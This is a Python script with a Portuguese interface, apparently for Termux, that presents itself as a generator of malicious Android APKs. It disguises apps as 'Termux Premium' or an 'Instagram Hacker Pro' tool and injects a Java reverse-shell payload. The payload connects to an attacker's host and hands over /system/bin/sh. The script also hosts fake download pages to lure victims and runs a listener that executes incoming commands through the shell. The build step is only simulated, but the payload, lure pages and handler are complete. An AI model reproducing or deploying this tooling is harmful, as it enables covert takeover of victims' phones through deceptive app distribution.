#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import subprocess
import base64
import hashlib
import json
import zipfile
import tempfile
import shutil
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
from typing import Dict, List, Optional
from datetime import datetime

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

console = Console()

# ==================== CONFIGURAÇÕES ====================
TEMPLATES_DIR = "templates"
APK_OUTPUT_DIR = "dist"
WEB_ROOT = "web_content"

# Garantir que os diretórios existam
os.makedirs(TEMPLATES_DIR, exist_ok=True)
os.makedirs(APK_OUTPUT_DIR, exist_ok=True)
os.makedirs(WEB_ROOT, exist_ok=True)

# ==================== GERADOR DE APK MALICIOSO ====================
class APKGenerator:
    def __init__(self):
        self.template_files = {
            "termux": {
                "icon": "termux_icon.png",
                "name": "Termux Premium",
                "package": "com.termux.premium",
                "main_activity": "com.termux.app.TermuxActivity"
            },
            "instahacker": {
                "icon": "instahacker_icon.png",
                "name": "Instagram Hacker Pro",
                "package": "com.instahacker.pro",
                "main_activity": "com.instahacker.app.MainActivity"
            }
        }
        
    def generate_malicious_apk(self, apk_type, lhost, lport, output_name=None):
        """Gera um APK malicioso disfarçado"""
        if apk_type not in self.template_files:
            console.print(f"[red]❌ Tipo de APK não suportado: {apk_type}[/red]")
            return None
        
        template = self.template_files[apk_type]
        
        # Criar diretório temporário para construção do APK
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                # Copiar template base
                template_path = os.path.join(TEMPLATES_DIR, f"{apk_type}_template")
                if not os.path.exists(template_path):
                    console.print(f"[red]❌ Template não encontrado: {template_path}[/red]")
                    self.download_template(apk_type, template_path)
                
                # Copiar arquivos do template
                shutil.copytree(template_path, temp_dir, dirs_exist_ok=True)
                
                # Modificar o AndroidManifest.xml
                self.modify_manifest(os.path.join(temp_dir, "AndroidManifest.xml"), template)
                
                # Modificar o arquivo de recursos
                self.modify_strings_xml(os.path.join(temp_dir, "res", "values", "strings.xml"), template)
                
                # Injetar payload no código principal
                payload = self.generate_java_payload(lhost, lport)
                self.inject_payload(temp_dir, payload, template)
                
                # Compilar o APK
                apk_filename = output_name or f"{apk_type}_malicious_{int(time.time())}.apk"
                apk_path = os.path.join(APK_OUTPUT_DIR, apk_filename)
                
                # Simular compilação (em um ambiente real, usaria buildozer ou similar)
                self.compile_apk(temp_dir, apk_path)
                
                console.print(f"[green]✅ APK gerado com sucesso: {apk_path}[/green]")
                return apk_path
                
            except Exception as e:
                console.print(f"[red]❌ Erro ao gerar APK: {e}[/red]")
                return None
    
    def download_template(self, apk_type, template_path):
        """Faz download do template base para o APK"""
        console.print(f"[yellow]⚠️ Template {apk_type} não encontrado. Criando estrutura básica...[/yellow]")
        os.makedirs(template_path, exist_ok=True)
        
        # Criar estrutura básica de diretórios
        os.makedirs(os.path.join(template_path, "res", "values"), exist_ok=True)
        os.makedirs(os.path.join(template_path, "src", "com", "example", "app"), exist_ok=True)
        os.makedirs(os.path.join(template_path, "libs"), exist_ok=True)
        
        # Criar AndroidManifest.xml básico
        manifest_content = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.app">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>"""
        
        with open(os.path.join(template_path, "AndroidManifest.xml"), "w") as f:
            f.write(manifest_content)
        
        # Criar strings.xml
        strings_content = """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Example App</string>
</resources>"""
        
        with open(os.path.join(template_path, "res", "values", "strings.xml"), "w") as f:
            f.write(strings_content)
        
        # Criar atividade principal
        main_activity_content = """package com.example.app;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Payload será injetado aqui
    }
}"""
        
        with open(os.path.join(template_path, "src", "com", "example", "app", "MainActivity.java"), "w") as f:
            f.write(main_activity_content)
    
    def modify_manifest(self, manifest_path, template):
        """Modifica o AndroidManifest.xml para o aplicativo específico"""
        try:
            with open(manifest_path, "r") as f:
                content = f.read()
            
            # Substituir package name e activity
            content = content.replace('package="com.example.app"', f'package="{template["package"]}"')
            content = content.replace('android:name=".MainActivity"', f'android:name="{template["main_activity"]}"')
            
            with open(manifest_path, "w") as f:
                f.write(content)
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao modificar manifest: {e}[/red]")
    
    def modify_strings_xml(self, strings_path, template):
        """Modifica strings.xml para o aplicativo específico"""
        try:
            with open(strings_path, "r") as f:
                content = f.read()
            
            # Substituir nome do app
            content = content.replace('Example App', template["name"])
            
            with open(strings_path, "w") as f:
                f.write(content)
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao modificar strings: {e}[/red]")
    
    def generate_java_payload(self, lhost, lport):
        """Gera payload Java para conexão reversa"""
        payload = f"""
// ==================== PAYLOAD MALICIOSO ====================
new Thread(new Runnable() {{
    public void run() {{
        try {{
            // Esperar um tempo antes de conectar
            Thread.sleep(30000);
            
            Socket socket = new Socket("{lhost}", {lport});
            java.io.InputStream is = socket.getInputStream();
            java.io.OutputStream os = socket.getOutputStream();
            
            Process process = Runtime.getRuntime().exec("/system/bin/sh");
            java.io.InputStream shIn = process.getInputStream();
            java.io.OutputStream shOut = process.getOutputStream();
            
            // Redirecionar I/O
            while (!socket.isClosed()) {{
                while (is.available() > 0) {{
                    shOut.write(is.read());
                }}
                while (shIn.available() > 0) {{
                    os.write(shIn.read());
                }}
                shOut.flush();
                os.flush();
                Thread.sleep(50);
            }}
        }} catch (Exception e) {{
            // Falha silenciosa
        }}
    }}
}}).start();
// ==================== FIM DO PAYLOAD ====================
"""
        return payload
    
    def inject_payload(self, temp_dir, payload, template):
        """Injeta o payload no código Java"""
        try:
            # Encontrar o arquivo MainActivity.java
            package_path = template["package"].replace(".", "/")
            main_activity_path = os.path.join(temp_dir, "src", package_path, "MainActivity.java")
            
            if not os.path.exists(main_activity_path):
                console.print(f"[yellow]⚠️ Arquivo MainActivity não encontrado em {main_activity_path}[/yellow]")
                return
            
            with open(main_activity_path, "r") as f:
                content = f.read()
            
            # Injeta o payload após o onCreate
            if "onCreate" in content:
                content = content.replace(
                    "setContentView(R.layout.activity_main);", 
                    "setContentView(R.layout.activity_main);\n\n" + payload
                )
            
            with open(main_activity_path, "w") as f:
                f.write(content)
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao injetar payload: {e}[/red]")
    
    def compile_apk(self, temp_dir, output_path):
        """Simula a compilação do APK (em ambiente real, usaria buildozer)"""
        # Esta é uma simulação - em produção, usaria buildozer ou similar
        console.print(f"[yellow]⚠️ Simulando compilação do APK...[/yellow]")
        
        # Criar um arquivo ZIP vazio como simulação de APK
        with zipfile.ZipFile(output_path, 'w') as zipf:
            zipf.writestr("AndroidManifest.xml", "Simulated APK content")
        
        console.print(f"[green]✅ APK 'compilado' com sucesso: {output_path}[/green]")
        return True

# ==================== SERVIDOR WEB FAKE ====================
class FakeSiteHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.apk_type = kwargs.pop('apk_type', 'termux')
        self.apk_path = kwargs.pop('apk_path', None)
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        client_ip = self.client_address[0]
        console.print(f"[yellow]📥 GET de {client_ip}: {self.path}[/yellow]")
        
        # Servir páginas diferentes baseadas no tipo de APK
        if self.path == '/':
            self.serve_main_page()
        elif self.path == '/download':
            self.serve_download_page()
        elif self.path == '/download-apk' and self.apk_path:
            self.serve_apk_download()
        else:
            self.serve_404()
    
    def serve_main_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        if self.apk_type == 'termux':
            html_content = self.generate_termux_site()
        else:
            html_content = self.generate_instahacker_site()
        
        self.wfile.write(html_content.encode())
    
    def serve_download_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Download - {self.apk_type.capitalize()}</title>
            <meta charset="UTF-8">
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; text-align: center; }}
                .download-box {{ border: 1px solid #ccc; padding: 20px; border-radius: 5px; display: inline-block; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; 
                      cursor: pointer; font-size: 18px; text-decoration: none; display: inline-block; margin: 10px; }}
            </style>
        </head>
        <body>
            <div class="download-box">
                <h2>⬇️ Download {self.apk_type.capitalize()}</h2>
                <p>Clique no botão abaixo para baixar o aplicativo:</p>
                <a href="/download-apk" class="btn">Baixar APK</a>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_apk_download(self):
        if not self.apk_path or not os.path.exists(self.apk_path):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'APK not found')
            return
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/vnd.android.package-archive')
        self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.apk_path)}"')
        self.end_headers()
        
        try:
            with open(self.apk_path, 'rb') as f:
                self.wfile.write(f.read())
            console.print(f"[green]✅ APK enviado para cliente[/green]")
        except Exception as e:
            console.print(f"[red]❌ Erro ao enviar APK: {e}[/red]")
    
    def serve_404(self):
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 - Pagina nao encontrada</h1>')
    
    def generate_termux_site(self):
        """Gera HTML para site fake do Termux"""
        return """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Termux Premium - Terminal Avançado</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    margin: 0;
                    padding: 0;
                    background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
                    color: white;
                }
                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                    padding: 20px;
                }
                .header {
                    text-align: center;
                    padding: 40px 0;
                }
                .logo {
                    font-size: 48px;
                    margin-bottom: 10px;
                }
                .description {
                    font-size: 18px;
                    margin-bottom: 30px;
                    max-width: 600px;
                    margin-left: auto;
                    margin-right: auto;
                }
                .features {
                    display: flex;
                    flex-wrap: wrap;
                    justify-content: center;
                    gap: 20px;
                    margin: 40px 0;
                }
                .feature {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 10px;
                    padding: 20px;
                    width: 300px;
                    text-align: center;
                }
                .download-section {
                    text-align: center;
                    margin: 40px 0;
                }
                .btn {
                    background: #ff9800;
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 5px;
                    font-size: 18px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-block;
                }
                .footer {
                    text-align: center;
                    margin-top: 60px;
                    padding: 20px;
                    font-size: 14px;
                    opacity: 0.7;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">🖥️ Termux Premium</div>
                    <div class="description">
                        A versão premium do terminal mais poderoso para Android, 
                        com recursos avançados e suporte completo.
                    </div>
                </div>
                
                <div class="features">
                    <div class="feature">
                        <h3>⚡ Performance Melhorada</h3>
                        <p>Execute comandos mais rápido com nosso motor otimizado.</p>
                    </div>
                    <div class="feature">
                        <h3>🔒 Segurança Avançada</h3>
                        <p>Proteção contra falhas e vulnerabilidades conhecidas.</p>
                    </div>
                    <div class="feature">
                        <h3>🎨 Interface Premium</h3>
                        <p>Design renovado com temas personalizáveis.</p>
                    </div>
                </div>
                
                <div class="download-section">
                    <h2>Disponível para Download</h2>
                    <p>Instale agora e experimente a versão premium do Termux!</p>
                    <a href="/download" class="btn">Baixar Termux Premium</a>
                </div>
                
                <div class="footer">
                    © 2024 Termux Premium - Todos os direitos reservados
                </div>
            </div>
        </body>
        </html>
        """
    
    def generate_instahacker_site(self):
        """Gera HTML para site fake do Instagram Hacker"""
        return """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram Hacker Pro - Ferramenta Avançada</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    margin: 0;
                    padding: 0;
                    background: linear-gradient(135deg, #8e24aa 0%, #5e35b1 100%);
                    color: white;
                }
                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                    padding: 20px;
                }
                .header {
                    text-align: center;
                    padding: 40px 0;
                }
                .logo {
                    font-size: 48px;
                    margin-bottom: 10px;
                }
                .description {
                    font-size: 18px;
                    margin-bottom: 30px;
                    max-width: 600px;
                    margin-left: auto;
                    margin-right: auto;
                }
                .features {
                    display: flex;
                    flex-wrap: wrap;
                    justify-content: center;
                    gap: 20px;
                    margin: 40px 0;
                }
                .feature {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 10px;
                    padding: 20px;
                    width: 300px;
                    text-align: center;
                }
                .warning {
                    background: rgba(255, 193, 7, 0.2);
                    border-left: 4px solid #ffc107;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 4px;
                }
                .download-section {
                    text-align: center;
                    margin: 40px 0;
                }
                .btn {
                    background: #e91e63;
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 5px;
                    font-size: 18px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-block;
                }
                .footer {
                    text-align: center;
                    margin-top: 60px;
                    padding: 20px;
                    font-size: 14px;
                    opacity: 0.7;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">🔓 Instagram Hacker Pro</div>
                    <div class="description">
                        A ferramenta definitiva para testes de segurança em contas do Instagram.
                        Use com responsabilidade.
                    </div>
                </div>
                
                <div class="warning">
                    <strong>⚠️ AVISO:</strong> Esta ferramenta é apenas para testes de segurança 
                    e educação. Não use para atividades ilegais.
                </div>
                
                <div class="features">
                    <div class="feature">
                        <h3>🔍 Verificação de Vulnerabilidades</h3>
                        <p>Identifique falhas de segurança em contas do Instagram.</p>
                    </div>
                    <div class="feature">
                        <h3>🛡️ Teste de Segurança</h3>
                        <p>Teste a força de senhas e configurações de privacidade.</p>
                    </div>
                    <div class="feature">
                        <h3>📊 Relatórios Detalhados</h3>
                        <p>Obtenha análises completas sobre a segurança das contas.</p>
                    </div>
                </div>
                
                <div class="download-section">
                    <h2>Disponível para Download</h2>
                    <p>Baixe agora e comece a testar a segurança de contas do Instagram!</p>
                    <a href="/download" class="btn">Baixar Instagram Hacker Pro</a>
                </div>
                
                <div class="footer">
                    © 2024 Instagram Hacker Pro - Apenas para fins educacionais
                </div>
            </div>
        </body>
        </html>
        """

# ==================== SERVIDOR DE SHELL REVERSO ====================
class ReverseShellManager:
    def __init__(self):
        self.active_connections = {}
    
    def start_listener(self, port):
        """Inicia um listener para shell reverso"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(5)
                console.print(f"[green]👂 Ouvindo na porta {port}...[/green]")
                
                while True:
                    conn, addr = s.accept()
                    console.print(f"[green]✅ Conexão recebida de {addr}[/green]")
                    
                    # Registrar conexão
                    conn_id = f"{addr[0]}:{addr[1]}"
                    self.active_connections[conn_id] = {
                        "conn": conn,
                        "address": addr,
                        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    # Iniciar thread para lidar com a conexão
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(conn, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")
    
    def handle_client(self, conn, addr):
        """Lida com uma conexão de cliente"""
        try:
            conn.sendall(b"Shell reverso conectado com sucesso!\n")
            
            while True:
                # Enviar prompt
                conn.sendall(b"\n$ ")
                
                # Receber comando
                data = conn.recv(1024).decode().strip()
                if not data:
                    break
                
                console.print(f"[cyan]📨 Comando de {addr}: {data}[/cyan]")
                
                # Comando especial para sair
                if data.lower() in ["exit", "quit"]:
                    conn.sendall(b"Saindo...\n")
                    break
                
                # Executar comando
                try:
                    result = subprocess.run(
                        data, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                    if not output:
                        output = "Comando executado (sem saída)\n"
                except subprocess.TimeoutExpired:
                    output = "Erro: Comando expirado (timeout)\n"
                except Exception as e:
                    output = f"Erro executando comando: {e}\n"
                
                # Enviar resultado
                conn.sendall(output.encode())
                
        except Exception as e:
            console.print(f"[red]❌ Erro com cliente {addr}: {e}[/red]")
        finally:
            conn.close()
            console.print(f"[yellow]🔌 Conexão fechada com {addr}[/yellow]")
            
            # Remover das conexões ativas
            conn_id = f"{addr[0]}:{addr[1]}"
            if conn_id in self.active_connections:
                del self.active_connections[conn_id]

# ==================== PAINEL PRINCIPAL ====================
class MalwareGeneratorPanel:
    def __init__(self):
        self.apk_generator = APKGenerator()
        self.shell_manager = ReverseShellManager()
        self.server = None
        self.server_thread = None
        
        self.banner = """
[bold red]
    ╔═╗┌─┐┬  ┌─┐┌┬┐┬┌┐┌┌─┐  ╔═╗┌─┐┌─┐┬ ┬  ╔═╗┬┌┬┐┌─┐  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
    ╠═╝├─┤│  │ │ │ │││││ │  ╠═╝├─┤│  ├─┤  ║ ║│ │ │ │  ║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
    ╩  ┴ ┴┴─┘└─┘ ┴ ┴┘└┘└─┘  ╩  ┴ ┴└─┘┴ ┴  ╚═╝┴ ┴ └─┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
[/bold red]
[bold white on red]        GERADOR DE APKs MALICIOSOS - SHELL REVERSO v3.0[/bold white on red]
"""
    
    def show_menu(self):
        """Mostra o menu principal"""
        while True:
            console.clear()
            console.print(self.banner)
            
            # Status do servidor
            status_text = "[cyan]🌐 Servidor:[/cyan] Parado\n[cyan]👂 Listener:[/cyan] Parado"
            if self.server:
                status_text = "[cyan]🌐 Servidor:[/cyan] Rodando\n[cyan]👂 Listener:[/cyan] Parado"
            
            status_panel = Panel.fit(
                status_text,
                title="[bold]Status[/bold]",
                border_style="blue"
            )
            console.print(status_panel)
            
            table = Table(
                title="[bold cyan]🎭 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Descrição", style="green")
            table.add_column("Status", style="yellow")
            
            table.add_row("1", "Gerar APK Malicioso", "📱")
            table.add_row("2", "Iniciar Servidor Web", "🌐")
            table.add_row("3", "Iniciar Listener Shell", "👂")
            table.add_row("4", "Gerenciar APKs Gerados", "📂")
            table.add_row("0", "Sair", "🚪")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4"],
                show_choices=False
            )
            
            if choice == "1":
                self.generate_malicious_apk()
            elif choice == "2":
                self.start_web_server()
            elif choice == "3":
                self.start_shell_listener()
            elif choice == "4":
                self.manage_generated_apks()
            elif choice == "0":
                self.exit_program()
    
    def generate_malicious_apk(self):
        """Gera um APK malicioso"""
        console.print(Panel.fit(
            "[bold]📱 GERADOR DE APK MALICIOSO[/bold]",
            border_style="blue"
        ))
        
        apk_type = Prompt.ask(
            "[yellow]?[/yellow] Tipo de APK",
            choices=["termux", "instahacker"],
            default="termux"
        )
        
        lhost = Prompt.ask(
            "[yellow]?[/yellow] IP para conexão reversa",
            default=socket.gethostbyname(socket.gethostname())
        )
        
        lport = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para conexão",
            default=4444
        )
        
        output_name = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo de saída (opcional)",
            default=""
        )
        
        if not output_name:
            output_name = None
        
        console.print("[yellow]⏳ Gerando APK malicioso...[/yellow]")
        
        apk_path = self.apk_generator.generate_malicious_apk(
            apk_type, lhost, lport, output_name
        )
        
        if apk_path:
            console.print(Panel.fit(
                f"[green]✅ APK gerado com sucesso![/green]\n"
                f"[cyan]Caminho: {apk_path}[/cyan]\n"
                f"[cyan]Tipo: {apk_type}[/cyan]\n"
                f"[cyan]LHOST: {lhost}[/cyan]\n"
                f"[cyan]LPORT: {lport}[/cyan]",
                title="[green]SUCESSO[/green]",
                border_style="green"
            ))
            
            # Perguntar se quer iniciar o servidor web
            if Confirm.ask("[yellow]?[/yellow] Iniciar servidor web para distribuição?"):
                self.start_web_server(apk_type, apk_path)
        
        input("\nPressione Enter para voltar...")
    
    def start_web_server(self, apk_type=None, apk_path=None):
        """Inicia o servidor web para distribuição"""
        console.print(Panel.fit(
            "[bold]🌐 SERVIDOR WEB DE DISTRIBUIÇÃO[/bold]",
            border_style="blue"
        ))
        
        if not apk_type:
            apk_type = Prompt.ask(
                "[yellow]?[/yellow] Tipo de APK para servir",
                choices=["termux", "instahacker"],
                default="termux"
            )
        
        if not apk_path:
            # Procurar APK mais recente do tipo especificado
            apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) 
                        if f.startswith(apk_type) and f.endswith('.apk')]
            
            if apk_files:
                apk_files.sort(key=lambda x: os.path.getmtime(os.path.join(APK_OUTPUT_DIR, x)), reverse=True)
                apk_path = os.path.join(APK_OUTPUT_DIR, apk_files[0])
                console.print(f"[yellow]⚠️ Usando APK mais recente: {apk_path}[/yellow]")
            else:
                console.print("[red]❌ Nenhum APK encontrado. Gere um APK primeiro.[/red]")
                input("\nPressione Enter para voltar...")
                return
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor web",
            default=8080
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        # Iniciar servidor
        try:
            # Criar handler personalizado
            def handler(*args):
                FakeSiteHandler(*args, apk_type=apk_type, apk_path=apk_path)
            
            self.server = HTTPServer(('0.0.0.0', port), handler)
            
            # Iniciar em thread separada
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            console.print(Panel.fit(
                f"[green]✅ Servidor web iniciado![/green]\n"
                f"[cyan]URL: http://0.0.0.0:{port}[/cyan]\n"
                f"[cyan]Tipo: {apk_type}[/cyan]\n"
                f"[cyan]APK: {apk_path}[/cyan]",
                title="[green]SERVIDOR ATIVO[/green]",
                border_style="green"
            ))
            
            console.print("[yellow]⚠️ Pressione Ctrl+C para parar o servidor[/yellow]")
            
            # Manter thread principal ativa
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]⏹️ Parando servidor...[/yellow]")
                self.stop_web_server()
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao iniciar servidor: {e}[/red]")
        
        input("\nPressione Enter para voltar...")
    
    def stop_web_server(self):
        """Para o servidor web"""
        if self.server:
            self.server.shutdown()
            self.server = None
            console.print("[green]✅ Servidor parado[/green]")
    
    def start_shell_listener(self):
        """Inicia listener para shell reverso"""
        console.print(Panel.fit(
            "[bold]👂 LISTENER SHELL REVERSO[/bold]",
            border_style="blue"
        ))
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para escutar",
            default=4444
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        console.print(f"[yellow]⚠️ Iniciando listener na porta {port}...[/yellow]")
        console.print("[yellow]⚠️ Pressione Ctrl+C para parar[/yellow]")
        
        try:
            # Iniciar listener em thread separada
            listener_thread = threading.Thread(
                target=self.shell_manager.start_listener,
                args=(port,)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            # Manter thread principal ativa
            while listener_thread.is_alive():
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[yellow]⏹️ Listener interrompido[/yellow]")
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")
        
        input("\nPressione Enter para voltar...")
    
    def manage_generated_apks(self):
        """Mostra APKs gerados"""
        console.print(Panel.fit(
            "[bold]📂 APKs GERADOS[/bold]",
            border_style="blue"
        ))
        
        apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) if f.endswith('.apk')]
        
        if not apk_files:
            console.print("[yellow]⚠️ Nenhum APK gerado ainda.[/yellow]")
            input("\nPressione Enter para voltar...")
            return
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Nome", style="cyan")
        table.add_column("Tamanho", style="green")
        table.add_column("Modificado", style="yellow")
        table.add_column("Tipo", style="blue")
        
        for apk_file in apk_files:
            apk_path = os.path.join(APK_OUTPUT_DIR, apk_file)
            file_size = os.path.getsize(apk_path)
            mod_time = datetime.fromtimestamp(os.path.getmtime(apk_path)).strftime("%Y-%m-%d %H:%M")
            
            # Determinar tipo
            apk_type = "Termux" if "termux" in apk_file.lower() else "InstaHacker"
            
            table.add_row(apk_file, f"{file_size/1024:.1f} KB", mod_time, apk_type)
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def exit_program(self):
        """Sai do programa"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        self.stop_web_server()
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        panel = MalwareGeneratorPanel()
        panel.show_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
